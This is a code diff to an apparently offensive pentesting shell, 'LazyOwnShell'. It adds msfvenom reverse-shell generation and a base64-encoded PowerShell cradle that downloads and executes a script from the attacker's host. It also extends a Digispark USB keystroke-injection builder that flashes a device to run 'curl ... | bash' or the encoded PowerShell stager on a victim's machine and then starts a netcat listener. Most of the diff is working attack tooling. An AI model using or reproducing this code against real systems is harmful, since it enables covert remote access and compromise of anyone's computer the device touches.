@@ -1786,6 +1786,7 @@ class LazyOwnShell(Cmd):
                 print_warn("codificando payload shell_encoded.exe ")
             os.system(commands[choice])
             os.system(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f raw -o sessions/shellcode.bin')
+            os.system(f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} PrependFork=true -o rev.bin')
             print_msg(f"Generated payload: {commands[choice]}")
             if choice == '15':
                 os.system("sudo keytool -genkey -V -keystore key.keystore -alias emi -keyalg RSA -keysize 2048 -validity 10000")
@@ -3937,7 +3938,7 @@ class LazyOwnShell(Cmd):
 
         lhost = self.params["lhost"]
         lport = self.params["lport"]
-
+        path = os.getcwd()
         if not lport or not lhost:
             print_msg(
                 f"lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload"
@@ -3951,6 +3952,33 @@ class LazyOwnShell(Cmd):
         os.system(f"echo '{revshell}' > sessions/revshell.sh ")
         os.system(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
         print_msg(f"echo 'curl http://{lhost}/revshell.sh|bash' | xclip -sel clip")
+        file_rev = f"{path}/sessions/win/payload.ps1"
+        file_rev_ses = f"{path}/sessions/payload.ps1"
+        with open(file_rev, 'r') as f:
+            rev_content = f.read()
+
+        rev_content = rev_content.replace("{lhost}",lhost).replace("{lport}",str(lport))
+
+        with open(file_rev_ses, 'w+') as f:
+            f.write(rev_content)
+
+        if not is_exist(file_rev_ses):
+            print_error("Error: payload.ps1 file was not created.")
+            return
+        else:
+            with open(file_rev_ses, 'r') as f:
+                content = f.read()
+                if not content.strip():
+                    print_error("Error: payload.ps1 file is empty.")
+                    return            
+        
+        payload = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')".replace("{lhost}",lhost)
+        print_msg(payload)
+        utf16_command = payload.encode('utf-16le')
+        base64_command = base64.b64encode(utf16_command).decode('utf-8')
+        payload = base64_command
+        ino_file = "digispark_win.ino"
+        print_msg(f"Generated Windows payload: powershell /enc  {payload}")        
         return
 
     def do_createwinrevshell(self, line):
@@ -13362,15 +13390,15 @@ class LazyOwnShell(Cmd):
         
         return
 
-    def do_lazyducky_digispark(self, line):
+    def do_duckyspark(self, line):
         """
-        Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.
+        duckyspark Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.
 
-        This method checks if Arduino CLI and Micronucleus are installed on the system.
+        duckyspark method checks if Arduino CLI and Micronucleus are installed on the system.
         If they are not available, it installs them. It then compiles a Digispark sketch 
         and uploads the generated .hex file to the Digispark device.
 
-        The method performs the following actions:
+        The method duckyspark performs the following actions:
         1. Checks for the presence of Arduino CLI and installs it if not available.
         2. Configures Arduino CLI for Digispark if not already configured.
         3. Generates a reverse shell payload and prepares the sketch for Digispark.
@@ -13391,66 +13419,139 @@ class LazyOwnShell(Cmd):
             install_cli = "curl -fsSL https://raw.githubusercontent.com/arduino/arduino-cli/master/install.sh | sh"
             os.system(install_cli)
 
-        print_msg("Configuring Arduino CLI for Digispark...")
-        os.system("arduino-cli core update-index")
-        os.system("arduino-cli core install digistump:avr")
+            print_msg("Configuring Arduino CLI for Digispark...")
+            os.system("arduino-cli core update-index")
+            os.system("arduino-cli core install digistump:avr")
 
         if not is_binary_present("micronucleus"):
             print_warn("Micronucleus not found, installing...")
             os.system("sudo apt-get install -y micronucleus")
+        payload_type = input("    [!] Payload target (1: Windows, 2: Linux): ").strip() or '1'
+        if payload_type == '2': 
+            p.onecmd("createrevshell")
+            lhost = self.params["lhost"]
+            if not check_lhost(lhost):
+                return
+            rev = f"curl http://{lhost}/revshell.sh | bash"
+            print_msg(rev)
 
-        p.onecmd("createrevshell")
-        lhost = self.params["lhost"]
-        if not check_lhost(lhost):
-            return
-        rev = f"curl http://{lhost}/revshell.sh | bash"
-        print_msg(rev)
+            encoded_bytes = base64.b64encode(rev.encode('utf-8'))
+            encoded_str = encoded_bytes.decode('utf-8')
+            payload = f"echo '{encoded_str}' | base64 -d | bash"
 
-        encoded_bytes = base64.b64encode(rev.encode('utf-8'))
-        encoded_str = encoded_bytes.decode('utf-8')
-        payload = f"echo '{encoded_str}' | base64 -d | bash"
+            print_msg(encoded_str)
+            print_msg(payload)
 
-        print_msg(encoded_str)
-        print_msg(payload)
+            path = os.getcwd()
+            file = f"{path}/modules/digispark.ino"
 
-        path = os.getcwd()
-        file = f"{path}/modules/digispark.ino"
+            if not is_exist(file):
+                return
 
-        if not is_exist(file):
-            return
-
-        with open(file, 'r') as f:
-            content = f.read()
-
-        content = content.replace("{payload}", payload)
-        os.system(f"mkdir {path}/sessions/revshell")
-        file_ino = f"{path}/sessions/revshell/revshell.ino"
-        with open(file_ino, 'w+') as f:
-            f.write(content)
-
-        if not is_exist(file_ino):
-            print_error("Error: revshell.ino file was not created.")
-            return
-        else:
-            with open(file_ino, 'r') as f:
+            with open(file, 'r') as f:
                 content = f.read()
-                if not content.strip():
-                    print_error("Error: revshell.ino file is empty.")
-                    return
 
-        print_msg(f"Compiling the sketch {file_ino}...")
-        output_dir = f"{path}/sessions/revshell"
-        compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --verbose --output-dir {output_dir}"
-        print_msg(compile_command)
-        os.system(compile_command)
+            content = content.replace("{payload}", payload)
+            os.system(f"mkdir {path}/sessions/revshell")
+            file_ino = f"{path}/sessions/revshell/revshell.ino"
+            with open(file_ino, 'w+') as f:
+                f.write(content)
 
-        hex_file_path = f"{path}/sessions/revshell/revshell.ino.hex" 
-        print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
-        upload_command = f"micronucleus --run {hex_file_path}"
-        print_msg(upload_command)
-        os.system(upload_command)
+            if not is_exist(file_ino):
+                print_error("Error: revshell.ino file was not created.")
+                return
+            else:
+                with open(file_ino, 'r') as f:
+                    content = f.read()
+                    if not content.strip():
+                        print_error("Error: revshell.ino file is empty.")
+                        return
 
-        print_msg("Upload completed.")
+            print_msg(f"Compiling the sketch {file_ino}...")
+            output_dir = f"{path}/sessions/revshell"
+            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            print_msg(compile_command)
+            os.system(compile_command)
+
+            hex_file_path = f"{path}/sessions/revshell/revshell.ino.hex" 
+            print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
+            upload_command = f"micronucleus --run {hex_file_path}"
+            print_msg(upload_command)
+            os.system(upload_command)
+           
+        elif payload_type == '1':
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+            path = os.getcwd()
+            if not check_lhost(lhost):
+                return
+            file_rev = f"{path}/sessions/win/payload.ps1"
+            file_rev_ses = f"{path}/sessions/payload.ps1"
+            with open(file_rev, 'r') as f:
+                rev_content = f.read()
+
+            rev_content = rev_content.replace("{lhost}",lhost).replace("{lport}",str(lport))
+
+            with open(file_rev_ses, 'w+') as f:
+                f.write(rev_content)
+
+            if not is_exist(file_rev_ses):
+                print_error("Error: payload.ps1 file was not created.")
+                return
+            else:
+                with open(file_rev_ses, 'r') as f:
+                    content = f.read()
+                    if not content.strip():
+                        print_error("Error: payload.ps1 file is empty.")
+                        return            
+            
+            payload = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')".replace("{lhost}",lhost)
+            print_msg(payload)
+            utf16_command = payload.encode('utf-16le')
+            base64_command = base64.b64encode(utf16_command).decode('utf-8')
+            payload = base64_command
+            ino_file = "digispark_win.ino"
+            print_msg(f"Generated Windows payload: powershell /enc  {payload}")
+            path = os.getcwd()
+            file = f"{path}/modules/{ino_file}"
+            if not is_exist(file):
+                return
+
+            with open(file, 'r') as f:
+                content = f.read()
+
+            content = content.replace("{payload}", payload)
+            os.system(f"mkdir {path}/sessions/winrevshell")
+            file_ino = f"{path}/sessions/winrevshell/winrevshell.ino"
+            with open(file_ino, 'w+') as f:
+                f.write(content)
+
+            if not is_exist(file_ino):
+                print_error("Error: winrevshell.ino file was not created.")
+                return
+            else:
+                with open(file_ino, 'r') as f:
+                    content = f.read()
+                    if not content.strip():
+                        print_error("Error: winrevshell.ino file is empty.")
+                        return
+
+            print_msg(f"Compiling the sketch {file_ino}...")
+            output_dir = f"{path}/sessions/winrevshell"
+            compile_command = f"arduino-cli compile --fqbn digistump:avr:digispark-tiny {file_ino} --output-dir {output_dir}"
+            print_msg(compile_command)
+            os.system(compile_command)
+
+            hex_file_path = f"{path}/sessions/winrevshell/winrevshell.ino.hex" 
+            print_msg(f"Uploading the compiled file {hex_file_path} to Digispark...")
+            upload_command = f"micronucleus --run {hex_file_path}"
+            print_msg(upload_command)
+            os.system(upload_command)
+
+        else:
+            print_error("Invalid payload target.")
+            return    
+        print_msg("Upload completed.")                    
         p.onecmd("nc")
         return
             
